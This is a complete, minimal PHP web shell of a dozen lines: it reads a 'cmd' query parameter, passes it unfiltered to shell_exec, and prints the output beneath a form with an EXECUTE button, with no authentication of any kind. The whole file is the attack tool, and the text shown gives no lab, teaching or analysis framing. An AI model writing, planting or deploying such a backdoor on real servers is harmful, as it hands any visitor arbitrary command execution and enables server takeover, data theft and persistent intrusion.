<?php   
    $cmd = $_GET["cmd"];

    if(!empty($cmd)){
            $result = shell_exec($cmd);
    }
?>

<form method="GET">
<input type="text" name="cmd">
<input type="submit" value="EXECUTE">
</form>
<hr>
<?=$result?>
